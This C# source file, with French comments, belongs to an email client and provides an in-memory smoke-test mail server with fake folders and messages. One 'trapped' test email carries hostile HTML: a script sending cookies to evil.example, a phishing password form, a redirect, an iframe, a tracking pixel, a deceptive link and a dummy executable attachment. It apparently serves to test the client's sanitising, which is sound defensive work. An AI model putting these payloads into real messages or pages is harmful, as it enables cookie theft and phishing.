using MimeKit;
using QuaiMail.Core.Accounts;
using QuaiMail.Core.Mail;
using QuaiMail.Core.Reading;

namespace QuaiMail.App.Services;

/// <summary>
/// Serveur de mail du test de fumée : des données de test en mémoire, aucune connexion réseau, jamais de vrai compte.
/// Il accepte un seul mot de passe (<see cref="Password"/>), comme un vrai serveur refuserait les autres.
/// </summary>
internal sealed class SmokeMailService : IMailService
{
    public const string Password = "mot de passe du test de fumée";

    private static readonly DateTimeOffset Newest = new(2026, 11, 25, 9, 30, 0, TimeSpan.FromHours(1));

    private static readonly MailFolderInfo[] Folders =
    [
        new("INBOX", "INBOX", 0, FolderRole.Inbox, true, 12, 120),
        new("Brouillons", "Brouillons", 0, FolderRole.Drafts, true, 0, 0),
        new("Envoyés", "Envoyés", 0, FolderRole.Sent, true, 0, 3),
        new("Corbeille", "Corbeille", 0, FolderRole.Trash, true, 0, 0),
        new("Archives", "Archives", 0, FolderRole.None, false, 0, 0),
        new("Archives/2026", "2026", 1, FolderRole.None, true, 0, 1),
    ];

    private static readonly string[] Senders = ["Camille Martin", "Service client", "Léa Dubois", "Mairie de Lyon", "Hugo Bernard"];

    private static readonly string[] Subjects =
    [
        "Réunion de jeudi", "Votre facture de novembre", "Photos du week-end", "Inscription à la cantine", "Re: devis cuisine",
    ];

    public Task VerifyAsync(Account account, string password, CancellationToken cancellationToken = default) =>
        password == Password
            ? Task.CompletedTask
            : Task.FromException(new MailConnectionException(MailError.Authentication, $"{account.Imap.Host}:{account.Imap.Port}", "IMAP"));

    public Task<IReadOnlyList<MailFolderInfo>> GetFoldersAsync(Account account, CancellationToken cancellationToken = default) =>
        Task.FromResult<IReadOnlyList<MailFolderInfo>>(Folders);

    public async Task<MessagePage> GetMessagesAsync(Account account, string folder, int skip, int take, CancellationToken cancellationToken = default)
    {
        // Un peu de délai, comme un vrai serveur : la barre de chargement apparaît.
        await Task.Delay(150, cancellationToken);
        var total = Folders.FirstOrDefault(f => f.FullName == folder)?.Total ?? 0;
        var messages = Enumerable.Range(0, Math.Max(0, Math.Min(take, total - skip)))
            .Select(i => total - skip - i)
            .Select(uid => new MessageHeader(
                (uint)uid,
                folder == "Archives/2026" ? "Facture d'électricité" : folder == "INBOX" && uid == TrappedUid ? "Votre facture de novembre" : Subjects[uid % Subjects.Length],
                folder == "INBOX" && uid == TrappedUid ? "Service client" : Senders[uid % Senders.Length],
                $"contact{uid % Senders.Length}@example.org",
                Newest.AddHours((uid - total) * 7),
                uid <= total - 12,
                uid % 17 == 0,
                2048))
            .ToList();
        return new MessagePage(1, total, messages);
    }

    /// <summary>UID du mail piégé de la boîte de réception (le plus récent).</summary>
    public const uint TrappedUid = 120;

    /// <summary>Changements de drapeaux demandés (lu / non lu, étoile).</summary>
    public List<(uint Uid, bool? Seen, bool? Flagged)> FlagChanges { get; } = [];

    public Task<MessageContent> GetMessageAsync(Account account, string folder, uint uid, CancellationToken cancellationToken = default)
    {
        var message = uid == TrappedUid && folder == "INBOX" ? Trapped() : Simple(uid);
        return Task.FromResult(MessageContent.FromMime(uid, message));
    }

    public Task SetFlagsAsync(Account account, string folder, uint uid, bool? seen, bool? flagged, CancellationToken cancellationToken = default)
    {
        FlagChanges.Add((uid, seen, flagged));
        return Task.CompletedTask;
    }

    public Task DisconnectAsync(string accountId) => Task.CompletedTask;

    /// <summary>
    /// Mail piégé : script, cadre, formulaire, pixel espion, image d'arrière-plan distante, lien trompeur, plus une
    /// image jointe (cid:), une pièce jointe ordinaire et un exécutable.
    /// </summary>
    private static MimeMessage Trapped()
    {
        var builder = new BodyBuilder
        {
            HtmlBody = """
                <html><head><style>.titre { color: #0f4c81; } body { background: url(https://tracker.example/fond.png) }</style>
                <meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/"></head>
                <body onload="alert('piège')">
                <h1 class="titre">Votre facture de novembre</h1>
                <p>Bonjour Camille,</p>
                <p><img src="cid:logo@example.org" alt="Logo" width="64" height="64"></p>
                <p>Votre facture est disponible. <a href="https://evil.example/connexion">https://www.banque.example/mon-compte</a></p>
                <script>document.location = 'https://evil.example/vol?c=' + document.cookie;</script>
                <iframe src="https://evil.example/cadre"></iframe>
                <form action="https://evil.example/vol"><input type="password" name="mdp"><button>Se connecter</button></form>
                <img src="https://tracker.example/pixel.gif?id=camille" width="1" height="1">
                <blockquote>Citation d'un ancien message.</blockquote>
                </body></html>
                """,
            TextBody = "Votre facture de novembre.",
        };
        var logo = builder.LinkedResources.Add("logo.png", Logo(), new ContentType("image", "png"));
        logo.ContentId = "logo@example.org";
        builder.Attachments.Add("facture-novembre.pdf", "%PDF-1.7 facture de test"u8.ToArray(), new ContentType("application", "pdf"));
        builder.Attachments.Add("mise-a-jour.exe", "MZ exécutable de test"u8.ToArray(), new ContentType("application", "octet-stream"));
        return new MimeMessage(
            [new MailboxAddress("Service client", "contact1@example.org")],
            [new MailboxAddress("Camille", "camille@example.org")],
            "Votre facture de novembre",
            builder.ToMessageBody());
    }

    private static MimeMessage Simple(uint uid) => new(
        [new MailboxAddress(Senders[uid % Senders.Length], $"contact{uid % Senders.Length}@example.org")],
        [new MailboxAddress("Camille", "camille@example.org")],
        Subjects[uid % Subjects.Length],
        new TextPart("plain") { Text = $"Bonjour,\n\nMessage de test n° {uid}.\nVoir https://example.org/page-{uid}\n" });

    /// <summary>Petite image PNG 24×24 (dégradé aux couleurs de Quai), image jointe du mail piégé.</summary>
    private static byte[] Logo() => Convert.FromBase64String("iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAIAAABvFaqvAAAAJklEQVR4nGPk92lkY2CgHLEwMDNQBYwaNGrQqEGjBo0aNGoQ+QAAsKsCCavxBAIAAAAASUVORK5CYII=");
}

/// <summary>Pas de réseau dans les tests de fumée : l'autoconfiguration n'interroge rien.</summary>
internal sealed class NoNetworkHandler : HttpMessageHandler
{
    protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) =>
        Task.FromException<HttpResponseMessage>(new HttpRequestException("Pas de réseau pendant le test de fumée."));
}
